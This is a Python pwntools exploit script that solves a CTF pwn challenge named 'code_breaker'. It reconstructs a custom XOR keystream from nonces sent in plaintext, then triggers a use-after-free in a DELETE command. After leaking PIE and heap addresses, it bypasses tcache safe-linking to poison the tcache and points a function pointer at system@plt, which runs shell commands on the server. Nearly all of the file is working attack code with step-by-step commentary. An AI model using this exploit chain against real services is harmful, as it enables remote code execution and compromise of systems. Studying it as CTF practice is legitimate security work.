#!/usr/bin/env python3
# Sunshine CTF 2026 - Pwn/code_breaker
#
# The "proprietary cipher" is a stateful XOR keystream, symmetric both ways:
#       buf[i] ^= S[ (M[i & 15] + C + i) & 0xFF ]        then C += len
#   S : 256-byte permutation at 0x2040, .rodata, static.
#   M : 16 bytes at 0x42D0, derived in the handshake from server||client nonces
#       -- both of which travel in PLAINTEXT, so M is fully computable by us.
#   C : TWO counters, 0x42C0 for recv and 0x42C4 for send, each cumulative over
#       message length. Modelling C per-message decrypts message #1 perfectly and
#       garbles every later one, which looks exactly like a broken exploit.
#
# The bug is in DELETE (0x13): it free()s unconditionally but only clears the slot
# when the refcount was 1.
#       free(slot->ptr);
#       if ((slot->refs)-- == 1) { slot->size = 0; slot->ptr = 0; }
# DUP (0x14) aliases one chunk into a second slot and bumps the source's refcount
# to 2, so DELETE on the source frees the chunk and LEAVES both pointers live:
# use-after-free with read (GET) and write (UPDATE) over a tcache chunk.
#
# No libc leak is needed. main() stores &sub_1390 in a function pointer at 0x40C0,
# command 0x16 dumps that region straight back to us (PIE leak), and command 0x15
# CALLS that pointer with our own NUL-terminated string as its argument. system is
# imported, so tcache-poisoning a chunk onto 0x40C0 and writing system@plt there
# turns 0x15 into system(our_string).
import sys, re
from pwn import *

context.update(arch='amd64', log_level='info')
HOST, PORT   = 'chal.sunshinectf.games', 26005
S_ADDR       = 0x2040
FPTR         = 0x40c0      # function pointer main() initialises to &sub_1390
FPTR_INIT    = 0x1390      # so leaked value - 0x1390 == PIE base
SYSTEM_PLT   = 0x1150
SZ           = 0x80        # request size -> 0x90 chunk, tcache-managed

remote_mode = len(sys.argv) > 1 and sys.argv[1] == 'remote'
elf = ELF('../code_breaker', checksec=False)
S   = elf.read(S_ADDR, 256)
assert S[:3] == bytes.fromhex('b782bf') and sorted(S) == list(range(256)), 'S table wrong'
log.success('test vector: S[0..2] = b7 82 bf, S is a permutation of 0..255')

rol8 = lambda x, n: ((x << n) | (x >> (8 - n))) & 0xFF

def derive_M(server_nonce, client_nonce):
    """4 rounds x 16 bytes, mixing both nonces through S.  M starts zeroed."""
    n = server_nonce + client_nonce                    # 32 bytes
    M = bytearray(16)
    for r in range(4):
        for i in range(16):
            M[i] = rol8(n[3 * r + i] ^ S[M[i] ^ n[(8 * r + i) & 0x1F]], 3)
    return bytes(M)

class Chan:
    """Framing is [BE16 len][body]; body is keystreamed once the handshake is done."""
    def __init__(self, io):
        self.io, self.M, self.c_send, self.c_recv = io, bytes(16), 0, 0
    def _raw_recv(self):
        n = u16(self.io.recvn(2), endian='big')
        return self.io.recvn(n) if n else b''
    def _raw_send(self, body):
        self.io.send(p16(len(body), endian='big') + body)
    def _crypt(self, body, c):
        return bytes(b ^ S[(self.M[i & 15] + c + i) & 0xFF] for i, b in enumerate(body))
    def send(self, body):                 # our send == the server's recv counter
        self._raw_send(self._crypt(body, self.c_recv)); self.c_recv += len(body)
    def recv(self):
        body = self._raw_recv()
        out = self._crypt(body, self.c_send); self.c_send += len(body)
        return out

io = remote(HOST, PORT) if remote_mode else process('./code_breaker_patched')
ch = Chan(io)

# ---- handshake. Steps 1 and 2 are plaintext, which is what hands us M.
hello = ch._raw_recv()
assert hello[0] == 1 and len(hello) == 17, f'unexpected hello {hello[:4].hex()}'
server_nonce = hello[1:17]
client_nonce = bytes(range(16))
ch._raw_send(b'\x02' + client_nonce)
ch.M = derive_M(server_nonce, client_nonce)
log.success(f'M = {ch.M.hex()}')

proof = bytes(S[ch.M[i]] ^ ch.M[(i + 5) & 0xF] for i in range(16))
ch.send(b'\x03' + proof)
ack = ch.recv()
assert ack[0] == 4 and ack[1] == 0, f'handshake rejected: {ack.hex()}'
log.success('handshake accepted -- keystream is synchronised')

# ---- protocol helpers
def put(slot, data):    ch.send(bytes([0x10, slot]) + p16(len(data), endian='big') + data); return ch.recv()
def get(slot):          ch.send(bytes([0x11, slot]));                                      return ch.recv()
def update(slot, data): ch.send(bytes([0x12, slot]) + p16(len(data), endian='big') + data); return ch.recv()
def delete(slot):       ch.send(bytes([0x13, slot, 0]));                                    return ch.recv()
def dup(dst, src):      ch.send(bytes([0x14, dst, src]));                                   return ch.recv()
def dump():             ch.send(bytes([0x16]));                                             return ch.recv()
def call(s):            ch.send(b'\x15' + s);                                               return ch.recv()

# ---- 1. PIE leak: 0x16 hands back the function pointer 0x15 will call.
leak = u64(dump()[2:10])
elf.address = leak - FPTR_INIT
log.success(f'fptr@0x40c0 = {leak:#x}  ->  PIE base = {elf.address:#x}')
assert elf.address & 0xfff == 0, f'PIE base {elf.address:#x} not page-aligned'

# ---- 2. two aliased-then-deleted chunks: tcache[0x90] gets two live pointers.
# Allocate BOTH chunks before freeing either: a put() issued after a delete()
# simply pops the chunk that delete just freed, so an interleaved loop only ever
# recycles one chunk and tcache never reaches a count of 2.
put(0, b'A' * SZ)          # chunk L1
put(2, b'A' * SZ)          # chunk L2, distinct
dup(1, 0)                  # slot0 refs -> 2, slot1 refs -> 1, both -> L1
dup(3, 2)                  # slot2 refs -> 2, slot3 refs -> 1, both -> L2
delete(0)                  # free(L1): refs was 2, so slot0 keeps the pointer
delete(2)                  # free(L2): head is now L2 -> L1, count 2
log.success('tcache[0x90] = [L2 -> L1], count 2, both still addressable (UAF)')

# ---- 3. read the head through the stale pointer: next == NULL for the last entry
#         freed, so the stored word is exactly chunk >> 12 (safe-linking shift).
# L1 was freed into an EMPTY bin, so its next is NULL and the stored word is
# exactly L1 >> 12. L2 sits in the same page, so that is also L2's shift.
heap_shift = u64(get(0)[4:12])
log.success(f'heap >> 12 = {heap_shift:#x}  (heap base {heap_shift << 12:#x})')
# Cross-check: L2 is the head, so its stored next unmasks to L1's real address,
# which must sit in the same page as the shift we just derived.
L1 = u64(get(2)[4:12]) ^ heap_shift
log.info(f'L2->next unmasks to L1 = {L1:#x}')
assert L1 >> 12 == heap_shift, 'safe-link cross-check failed: L1 not in the leaked page'

# ---- 4. poison the head's next to the function pointer's page.
update(2, p64(heap_shift ^ (elf.address + FPTR)))
log.success(f'tcache head -> {elf.address + FPTR:#x}')

# ---- 5. two same-size allocations: the real chunk, then 0x40C0 itself. PUT does
#         malloc then memcpy of exactly our bytes -- no memset to fight.
put(4, b'B' * SZ)
put(5, p64(elf.address + SYSTEM_PLT).ljust(SZ, b'\x00'))
log.success(f'fptr@0x40c0 := system@plt ({elf.address + SYSTEM_PLT:#x})')

# verify the write actually landed before relying on it
now = u64(dump()[2:10])
log.info(f'fptr@0x40c0 reads back as {now:#x} (want {elf.address + SYSTEM_PLT:#x})')
assert now == elf.address + SYSTEM_PLT, 'function pointer was NOT overwritten'

# ---- 6. command 0x15 calls that pointer with our NUL-terminated string. Do NOT
#         wait for a frame: system() blocks until the command exits, and the
#         command's own stdout goes straight to fd 1 -- i.e. onto the wire in
#         PLAINTEXT, ahead of the encrypted echo reply.
ch.send(b'\x15' + b'cat flag.txt flag /flag.txt /flag 2>/dev/null; ls -a')
out = io.recvrepeat(3).decode('latin1')
print(out)
m = re.search(r'sun\{[^}]*\}', out)
if m: log.success(f'FLAG: {m.group(0)}')
else: io.interactive()
